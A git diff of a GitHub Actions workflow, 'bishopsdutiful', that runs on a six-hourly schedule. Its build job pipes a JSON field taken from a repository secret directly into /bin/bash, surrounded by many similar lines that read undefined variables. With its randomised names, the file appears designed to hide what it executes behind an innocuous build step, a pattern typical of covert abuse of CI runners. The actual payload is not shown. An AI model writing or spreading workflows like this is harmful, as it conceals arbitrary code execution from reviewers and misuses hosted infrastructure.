@@ -3,30 +3,24 @@ name: bishopsdutiful
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 5/6 * * *'
+    - cron: '25 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: bishopsdutiful
         env:
-          tpoyx513: ${{ secrets.tpoyx513 }}
+          e7: ${{ secrets.e7 }}
         run: |
-          echo $tpoyx513 | jq -r .gmp858 | /bin/bash
-          echo $hk58098 | jq -r .fyl158 | /bin/bash
-          echo $tva21 | jq -r .hb2664 | /bin/bash
-          echo $kwnk4471 | jq -r .ana501 | /bin/bash
-          echo $r577 | jq -r .v8475 | /bin/bash
-          echo $fagao8 | jq -r .tr3 | /bin/bash
-          echo $wnbg2 | jq -r .eiabb9 | /bin/bash
-          echo $tjy77 | jq -r .intq39 | /bin/bash
-          echo $agbbj350 | jq -r .l0 | /bin/bash
-          echo $hg12 | jq -r .xp830 | /bin/bash
-          echo $tykn49 | jq -r .xrh97742 | /bin/bash
-          echo $hq63 | jq -r .usfq15 | /bin/bash
-          echo $do843 | jq -r .a66527 | /bin/bash
-          echo $hnrpz19 | jq -r .mi7232 | /bin/bash
-          echo $bz4 | jq -r .p605 | /bin/bash
+          echo $e7 | jq -r .ipv53 | /bin/bash
+          echo $oqhbl4 | jq -r .qz55766 | /bin/bash
+          echo $klmad1452 | jq -r .h1 | /bin/bash
+          echo $gucte87490 | jq -r .oy956 | /bin/bash
+          echo $f41 | jq -r .fiexh6448 | /bin/bash
+          echo $bl81850 | jq -r .im39855 | /bin/bash
+          echo $krtr3385 | jq -r .fv865 | /bin/bash
+          echo $cpjq22828 | jq -r .t59682 | /bin/bash
+          echo $tdqo20 | jq -r .gw3254 | /bin/bash
+          echo $jq9687 | jq -r .euxtw01626 | /bin/bash
 
